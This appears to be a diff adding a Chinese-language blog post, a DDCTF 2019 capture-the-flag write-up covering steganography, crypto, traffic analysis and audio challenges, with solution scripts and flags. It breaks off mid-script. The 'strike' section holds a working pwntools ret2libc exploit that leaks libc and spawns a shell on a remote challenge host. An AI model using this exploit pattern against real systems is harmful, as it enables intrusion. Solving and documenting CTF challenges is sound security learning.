@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="hustcw">
+
+
+
+<meta name="description" content="写在前面基本没有pwn题,唯一一个还放在misc里了。。实在是有点难受，别的题算挺简单的，断断续续打了几天，记录一下吧。过几天抽空学一下pwn更多的技巧和angr、还有比较想学的是android类型的安全问题，继续加油">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF 2019 Writeup">
+<meta property="og:url" content="https://hustcw.github.io/2019/04/19/DDCTF-2019-WriteUp/index.html">
+<meta property="og:site_name" content="Hustcw">
+<meta property="og:description" content="写在前面基本没有pwn题,唯一一个还放在misc里了。。实在是有点难受，别的题算挺简单的，断断续续打了几天，记录一下吧。过几天抽空学一下pwn更多的技巧和angr、还有比较想学的是android类型的安全问题，继续加油">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-09-23T18:38:52.260Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DDCTF 2019 Writeup">
+<meta name="twitter:description" content="写在前面基本没有pwn题,唯一一个还放在misc里了。。实在是有点难受，别的题算挺简单的，断断续续打了几天，记录一下吧。过几天抽空学一下pwn更多的技巧和angr、还有比较想学的是android类型的安全问题，继续加油">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Hustcw" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favico.png">
+
+
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>DDCTF 2019 Writeup | Hustcw</title>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.4.0/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/assets/img/MyAvatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">hustcw</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/Hustcw" title="GitHub"></a>
+                            
+                                <a class="fa Email" href="mailto:hustcw1998@gmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/angr/">angr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/formatstr/">formatstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/">glibc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac/">mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/machine-learning/">machine learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/off-by-one/">off-by-one</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/plan/">plan</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rop/">rop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/study/">study</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zip/">zip</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">hustcw</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/assets/img/MyAvatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">hustcw</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Hustcw" title="GitHub"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:hustcw1998@gmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-DDCTF-2019-WriteUp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/04/19/DDCTF-2019-WriteUp/" class="article-date">
+      <time datetime="2019-04-19T06:23:04.000Z" itemprop="datePublished">2019-04-19</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DDCTF 2019 Writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2><span id="写在前面">写在前面</span></h2><p>基本没有pwn题,唯一一个还放在misc里了。。实在是有点难受，别的题算挺简单的，断断续续打了几天，记录一下吧。过几天抽空学一下pwn更多的技巧和angr、还有比较想学的是android类型的安全问题，继续加油<br><a id="more"></a></p>
+<h2><span id="misc">misc</span></h2><h3><span id="真-签到题">真-签到题</span></h3><p><code>DDCTF{return DDCTF::get(2019)-&gt;flagOf(0);}</code></p>
+<h3><span id="北京地铁">北京地铁</span></h3><p>lsb隐写的密文，zsteg提取：<br>秘钥提示在地铁图上，魏公村被标记了一下，用小写字母补\x00得到秘钥，ECB解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line">obj = AES.new(<span class="string">'weigongcun'</span>+<span class="string">'\x00'</span>*<span class="number">6</span>, AES.MODE_ECB)</span><br><span class="line"><span class="keyword">print</span> obj.decrypt(b.b64decode(<span class="string">'iKk/Ju3vu4wOnssdIaUSrg=='</span>))</span><br></pre></td></tr></table></figure>
+<h3><span id="strike">strike</span></h3><p>一开始以为简单溢出一下过大小的check、然后rop一个puts泄露libc就行了。结果error也是很吃惊，看了下汇编发现在esp上动了手脚，esp跑飞了。所以先打出栈地址然后rop就getshell了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'h'</span>*<span class="number">39</span>)</span><br><span class="line">p.recvuntil(<span class="string">'hhh\n'</span>)</span><br><span class="line">ebp_addr = u32(p.recvuntil(<span class="string">'password: '</span>)[:<span class="number">4</span>])</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak libc_start_main_got addr and return to main again"</span></span><br><span class="line">payload = <span class="string">'1'</span> * <span class="number">68</span> + p32(ebp_addr + <span class="number">8</span>) + <span class="string">'a'</span>*<span class="number">8</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">'puts'</span>]) + p32(<span class="number">0x8048669</span>) + p32(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bye!\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_start_addr = u32(p.recvuntil(<span class="string">'Enter username: '</span>)[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc_start_addr)</span><br><span class="line"></span><br><span class="line">libc_base = libc_start_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base'</span>,hex(libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr '</span>,hex(system_addr)</span><br><span class="line"></span><br><span class="line">shell_str = libc_base+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'h'</span>*<span class="number">39</span>)</span><br><span class="line">p.recvuntil(<span class="string">'hhh\n'</span>)</span><br><span class="line">ebp_addr = u32(p.recvuntil(<span class="string">'password: '</span>)[:<span class="number">4</span>])</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">'1'</span> * <span class="number">68</span> + p32(ebp_addr + <span class="number">8</span>) + <span class="string">'a'</span>*<span class="number">8</span> </span><br><span class="line">payload += p32(system_addr) + p32(<span class="number">0x8048669</span>) + p32(shell_str)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3><span id="wireshark">Wireshark</span></h3><p>看http流量可以发现先访问了一个图片隐写站点，然后流量里一共有三张图。扣出来之后有一个无法显示，猜测是crc校验不对，根据crc爆破一下高度就可以看到key。然后访问图片隐写的站点拿另外两张图分别试一下，解密成功。转成ascii即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#图片中隐藏的信息为：flag+AHs-#44444354467B4E62756942556C52356C687777324F6670456D75655A6436344F6C524A3144327D+AH0-</span></span><br><span class="line">In [<span class="number">1</span>]: <span class="string">'44444354467B4E62756942556C52356C687777324F6670456D75655A6436344F6C524A3144327D'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">Out[<span class="number">1</span>]: <span class="string">'DDCTF&#123;NbuiBUlR5lhww2OfpEmueZd64OlRJ1D2&#125;'</span></span><br></pre></td></tr></table></figure></p>
+<h3><span id="联盟决策大会">联盟决策大会</span></h3><p>正常拉格朗日差值，1组和2组分别恢复秘密key1和key2，然后用key1，key2恢复秘密key。用sage写一下跑出来是16进制编码，转成ascii得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">R = PolynomialRing(ZZ,<span class="string">'x'</span>)</span><br><span class="line">p =<span class="number">0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533</span></span><br><span class="line">k = [<span class="number">0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E</span>,</span><br><span class="line">    <span class="number">0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6</span>,</span><br><span class="line">    <span class="number">0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D</span>,</span><br><span class="line">    <span class="number">0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61</span>,</span><br><span class="line">    <span class="number">0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8</span>,</span><br><span class="line">    <span class="number">0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510</span>]</span><br><span class="line"></span><br><span class="line">poly1 = R(k[<span class="number">0</span>]*(x<span class="number">-2</span>)*(x<span class="number">-4</span>)*inverse_mod((<span class="number">1</span><span class="number">-2</span>)*(<span class="number">1</span><span class="number">-4</span>),p))+R(k[<span class="number">1</span>]*(x<span class="number">-1</span>)*(x<span class="number">-4</span>)*inverse_mod((<span class="number">2</span><span class="number">-1</span>)*(<span class="number">2</span><span class="number">-4</span>),p))+R(k[<span class="number">2</span>]*(x<span class="number">-1</span>)*(x<span class="number">-2</span>)*inverse_mod((<span class="number">4</span><span class="number">-1</span>)*(<span class="number">4</span><span class="number">-2</span>),p))</span><br><span class="line">poly2 = R(k[<span class="number">3</span>]*(x<span class="number">-4</span>)*(x<span class="number">-5</span>)*inverse_mod(<span class="number">3</span><span class="number">-4</span>,p)*inverse_mod(<span class="number">3</span><span class="number">-5</span>,p))+R(k[<span class="number">4</span>]*(x<span class="number">-3</span>)*(x<span class="number">-5</span>)*inverse_mod(<span class="number">4</span><span class="number">-3</span>,p)*inverse_mod(<span class="number">4</span><span class="number">-5</span>,p))+R(k[<span class="number">5</span>]*(x<span class="number">-3</span>)*(x<span class="number">-4</span>)*inverse_mod(<span class="number">5</span><span class="number">-3</span>,p)*inverse_mod(<span class="number">5</span><span class="number">-4</span>,p))</span><br><span class="line">k1 = int(hex(poly1(<span class="number">0</span>)%p),<span class="number">16</span>)</span><br><span class="line">k2 = int(hex(poly2(<span class="number">0</span>)%p),<span class="number">16</span>)</span><br><span class="line">poly3 = R(k1*(x<span class="number">-2</span>)*inverse_mod(<span class="number">1</span><span class="number">-2</span>,p))+R(k2*(x<span class="number">-1</span>)*inverse_mod(<span class="number">2</span><span class="number">-1</span>,p))</span><br><span class="line"><span class="keyword">print</span> hex(poly3(<span class="number">0</span>)%p)</span><br></pre></td></tr></table></figure>
+<h3><span id="伪-声纹锁">伪-声纹锁</span></h3><p>根据提示写一个istft，刚开始跑出来距离题目要求的偏差小于0.001并没有实现，噪声还有点大，然后就试着取实部虚部的max、min、还有均值，发现均值的效果最好。拿AU去噪声，人声增强听了之后可以开始听了，有点听不出来的大概有三位，给出可能的结果、写个脚本比较有意义的flag就ok了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 3.6</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"><span class="keyword">import</span> cmath</span><br><span class="line"><span class="keyword">import</span> librosa <span class="comment"># v0.6.2, maybe ffmpeg is needed as backend</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># v1.15.4</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="comment"># Pillow v5.4.1</span></span><br><span class="line"></span><br><span class="line">window_size = <span class="number">2048</span></span><br><span class="line">step_size = <span class="number">100</span></span><br><span class="line">max_lim = <span class="number">0.15</span></span><br><span class="line">f_ubound = <span class="number">2000</span></span><br><span class="line">f_bins = <span class="number">150</span></span><br><span class="line">sr = <span class="number">15000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform_x</span><span class="params">(x, f_ubound=f_ubound, f_bins=f_bins)</span>:</span></span><br><span class="line">    freqs = np.logspace(np.log10(<span class="number">20</span>), np.log10(f_ubound), f_bins)</span><br><span class="line">    seqs = []</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> freqs:</span><br><span class="line">        seq = []</span><br><span class="line">        d = cmath.exp(<span class="number">-2j</span> * cmath.pi * f / sr)</span><br><span class="line">        coeff = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> range(len(x)):</span><br><span class="line">            seq.append(x[t] * coeff)</span><br><span class="line">            coeff *= d</span><br><span class="line">        seqs.append(seq)</span><br><span class="line">    sums = []</span><br><span class="line">    <span class="keyword">for</span> seq <span class="keyword">in</span> seqs:</span><br><span class="line">        X = [sum(seq[:window_size])/window_size]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> range(step_size, len(x), step_size):</span><br><span class="line">            X.append(X[<span class="number">-1</span>]-sum(seq[t-step_size:t])/window_size)</span><br><span class="line">            <span class="keyword">if</span> t+window_size-step_size &lt; len(x): X[<span class="number">-1</span>] += sum(seq[t+window_size-step_size:t+window_size])/window_size</span><br><span class="line">        sums.append(X)</span><br><span class="line">    <span class="keyword">return</span> freqs, np.array(sums)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_diff</span><span class="params">(x, spec)</span>:</span></span><br><span class="line">    f, x = transform_x(x)</span><br><span class="line">    print(x.shape)</span><br><span class="line">    print(spec.shape)</span><br><span class="line">    <span class="keyword">if</span> x.shape != spec.shape: <span class="keyword">return</span> <span class="number">999</span></span><br><span class="line">    print((np.abs(x)-np.abs(spec)))</span><br><span class="line">    <span class="keyword">return</span> np.average((np.abs(x)-np.abs(spec))**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_map</span><span class="params">(v, old_dbound, old_ubound, new_dbound, new_ubound)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (v-old_dbound)*<span class="number">1.0</span>/(old_ubound-old_dbound)*(new_ubound-new_dbound) + new_dbound</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image_to_array</span><span class="params">(img)</span>:</span></span><br><span class="line">    img_arr = linear_map(np.array(img.getdata(), np.uint8).reshape(img.size[<span class="number">1</span>], img.size[<span class="number">0</span>], <span class="number">3</span>), <span class="number">0</span>, <span class="number">255</span>, -max_lim, max_lim)</span><br><span class="line">    <span class="keyword">return</span> img_arr[:, :, <span class="number">1</span>] + img_arr[:, :, <span class="number">2</span>] * <span class="number">1j</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">istft</span><span class="params">(stftdata)</span>:</span></span><br><span class="line">    meta =  np.matrix.tolist(stftdata)</span><br><span class="line">    freqs = np.logspace(np.log10(<span class="number">20</span>), np.log10(f_ubound), f_bins)</span><br><span class="line">    fragment = stftdata.shape[<span class="number">1</span>]*step_size</span><br><span class="line">    wav = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(fragment+window_size)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx_m <span class="keyword">in</span> range(stftdata.shape[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> idx_w <span class="keyword">in</span> range(step_size*idx_m,step_size*idx_m+window_size):</span><br><span class="line">            idft = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> idx_f <span class="keyword">in</span> range(len(freqs)):</span><br><span class="line">                idft+=meta[idx_f][idx_m]*cmath.exp(<span class="number">2j</span>*cmath.pi*freqs[idx_f]*idx_w/sr)</span><br><span class="line">            wav[idx_w]+=idft</span><br><span class="line">    <span class="keyword">return</span> wav[:fragment]</span><br><span class="line"></span><br><span class="line">img_data = image_to_array(Image.open(<span class="string">'fingerprint.png'</span>))</span><br><span class="line">print(img_data.shape)</span><br><span class="line">wav_data = istft(img_data)</span><br><span class="line">min_d = np.zeros(len(wav_data))</span><br><span class="line">max_d = np.zeros(len(wav_data))</span><br><span class="line">mean_d = np.zeros(len(wav_data))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(wav_data)):</span><br><span class="line">    min_d[i] = min(wav_data[i].real,wav_data[i].imag)</span><br><span class="line">    max_d[i] = max(wav_data[i].real,wav_data[i].imag)</span><br><span class="line">    mean_d[i] = (wav_data[i].real+wav_data[i].imag)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'write wav'</span>)</span><br><span class="line">librosa.output.write_wav(<span class="string">'min.wav'</span>, np.array(min_d), sr=sr)</span><br><span class="line">librosa.output.write_wav(<span class="string">'max.wav'</span>, np.array(max_d), sr=sr)</span><br><span class="line">librosa.output.write_wav(<span class="string">'mean.wav'</span>, np.array(mean_d), sr=sr)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'min'</span>)</span><br><span class="line">sqr_diff = calc_diff(min_d, img_data)</span><br><span class="line">print(<span class="string">'sqr diff ='</span>, sqr_diff)</span><br><span class="line"><span class="keyword">if</span> sqr_diff &lt; <span class="number">0.001</span>:</span><br><span class="line">    print(<span class="string">'access granted, congratulations!'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'access denied'</span>)</span><br><span class="line">    </span><br><span class="line">print(<span class="string">'max'</span>)</span><br><span class="line">sqr_diff = calc_diff(max_d, img_data)</span><br><span class="line">print(<span class="string">'sqr diff ='</span>, sqr_diff)</span><br><span class="line"><span class="keyword">if</span> sqr_diff &lt; <span class="number">0.001</span>:</span><br><span class="line">    print(<span class="string">'access granted, congratulations!'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'access denied'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'mean'</span>)   </span><br><span class="line">sqr_diff = calc_diff(mean_d, img_data)</span><br><span class="line">print(<span class="string">'sqr diff ='</span>, sqr_diff)</span><br><span class="line"><span class="keyword">if</span> sqr_diff &lt; <span class="number">0.001</span>:</span><br><span class="line">    print(<span class="string">'access granted, congratulations!'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'access 